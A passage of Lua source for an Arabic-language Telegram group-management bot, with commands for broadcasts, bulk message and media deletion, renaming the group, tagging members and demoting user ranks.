tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if text == "مسح رسايلي" or text == "مسح رسائلي" or text == "مسح رسايلي" or text == "مسح رسائلي" then  
send(msg.chat_id_, msg.id_,' ⋄تم مسح رسائلك'  )  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if text == "رسايلي" or text == "رسائلي" or text == "msg" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
send(msg.chat_id_, msg.id_,' ⋄عدد رسائلك »> { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
if text == 'تفعيل الاذاعه' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if database:get(bot_id..'Bc:Bots') then
database:del(bot_id..'Bc:Bots') 
Text = '\n⋄تم تفعيل الاذاعه' 
else
Text = '\n⋄بالتاكيد تم تفعيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاذاعه' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Bc:Bots') then
database:set(bot_id..'Bc:Bots',true) 
Text = '\n⋄تم تعطيل الاذاعه' 
else
Text = '\n⋄بالتاكيد تم تعطيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل التواصل' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n⋄تم تفعيل التواصل' 
else
Text = '\n⋄بالتاكيد تم تفعيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n⋄تم تعطيل التواصل' 
else
Text = '\n⋄بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n⋄تم تفعيل البوت الخدمي' 
else
Text = '\n⋄بالتاكيد تم تفعيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n⋄تم تعطيل البوت الخدمي' 
else
Text = '\n⋄بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match('^مسح (%d+)$') and Manager2(msg) then
if not database:get(bot_id..'S00F4:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local num = tonumber(text:match('^مسح (%d+)$')) 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if num > 1500 then 
send(msg.chat_id_, msg.id_,'⋄تستطيع المسح 1500 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,'⋄تم مسح {'..num..'}')  
database:setex(bot_id..'S00F4:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
if text == "مسح الميديا" then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end
msgm = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
msgm[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = msgm},function(arg,data)
new = 0
msgm2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
msgm2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,msgm2)
end,nil)  
send(msg.chat_id_, msg.id_,"⋄تم مسح جميع الميديا")
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) and msg.reply_to_message_id_ == 0 then
database:sadd(bot_id.."S00F4:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
local list = database:smembers(bot_id.."S00F4:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "⋄تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."S00F4:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = "⋄لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("عدد الميديا") then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end  
local num = database:smembers(bot_id.."S00F4:allM"..msg.chat_id_)
for k,v in pairs(num) do
local numl = v
if numl then
l = "⋄عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = "⋄لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, l)
end
if text == "مسح التعديل" then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end
Msgs = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Msgs[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data)
new = 0
Msgs2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Msgs2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Msgs2)
end,nil)  
send(msg.chat_id_, msg.id_,'⋄تم مسح جميع الرسائل المعدله')
end
if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
if SudoBot2(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ⋄ارسل لي الاسم الان ")  
end
return false
end

--[[if text == ''..Name_Bot..'' then  
local Black_Msg = {
'نعم',
' الواد مسك في اسمي مش هيسيبه',
'وبعدين ؟ 🥺',
' فضحتني 😓',
'هاا شتريد كافي ☹️',
' '..Name_Bot..' مش هنا ',
' مين '..Name_Bot..' دا 😒 ',
'كول عمري وش تريد اني '..Name_Bot..''
}
send(msg.chat_id_, msg.id_,'['..Black_Msg[math.random(#Black_Msg)]..']') 
return false
end
]]--
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end 
if database:get(bot_id..'Bc:Bots') and not SudoBot2(msg) then 
send(msg.chat_id_, msg.id_,' ⋄الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل الان اذاعتك \n⋄للخروج ارسل الغاء") 
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end 
if database:get(bot_id..'Bc:Bots') and not SudoBot2(msg) then 
send(msg.chat_id_, msg.id_,' ⋄الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل الان اذاعتك \n⋄للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه" then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end 
if database:get(bot_id..'Bc:Bots') and not SudoBot2(msg) then 
send(msg.chat_id_, msg.id_,' ⋄الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص" then
if not SudoBot3(msg)  then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
return false
end 
if database:get(bot_id..'Bc:Bots') and not SudoBot2(msg) then 
send(msg.chat_id_, msg.id_,' ⋄الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⋄ارسل لي التوجيه الان") 
return false
end 
if text and text:match('^ضع اسم (.*)') and Manager2(msg) or text and text:match('^وضع اسم (.*)') and Manager2(msg) then 
local Name = text:match('^ضع اسم (.*)') or text and text:match('^وضع اسم (.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_," ⋄البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⋄ليست لدي صلاحية تغير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,' ⋄تم تغيير اسم الجروب الى {['..Name..']}')  
end
end,nil) 
end
if text == "تاك للكل" then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
},function(ta,Black)
local t = "\nツ قائمة الاعضاء \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
x = 0
local list = Black.members_
for k, v in pairs(list) do
x = x + 1
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..x.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..x.." → {"..v.user_id_.."}\n"
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager2(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if database:sismember(bot_id.."Sudo:bot3",result.id_) then
dev = "المطور ،" else dev = "" end
if database:sismember(bot_id.."CoSu",result.id_) then
cu = "المالك ،" else cu = "" end
if database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, result.id_) then
crr = "منشئ اساسي ،" else crr = "" end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.id_) then
cr = "منشئ ،" else cr = "" end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.id_) then
own = "مدير ،" else own = "" end
if database:sismember(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_) then
mn = 'مدير ثاني ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.id_) then
mod = "ادمن ،" else mod = "" end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.id_) then
vip = "مميز ،" else vip = ""
end
if Can_or_NotCan(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n⋄تم تنزيل الشخص من الرتب التاليه \n⋄{ "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n⋄عذرا العضو لايملك رتبه \n")
end
if tonumber(msg.sender_user_id_) == true then
database:srem(bot_id.."Sudo:bot3", result.id_)
database:srem(bot_id.."CoSu", result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Sudo:bot3",msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."CoSu",msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, start_function, nil)
end

if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_," ⋄لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id..'Sudo:bot3',result.sender_user_id_) then
dev = 'المطور ،' else dev = '' end
if database:sismember(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_) then
cu = 'المالك ،' else cu = '' end
if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = 'منشئ اساسي ،' else crr = '' end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
cr = 'منشئ ،' else cr = '' end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_) then
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'مدير ثاني ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = 'ادمن ،' else mod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_) then
vip = 'مميز ،' else vip = ''
end
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n⋄تم تنزيل الشخص من الرتب التاليه \n⋄{ "..dev..''..crr..''..cr..''..own..''..mod..''..mn..''..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n⋄عذرا العضو لايملك رتبه \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'Sudo:bot3', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:bot2',msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:bot3',msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if database:get(bot_id..'bot:viewget'..msg.sender_user_id_) then
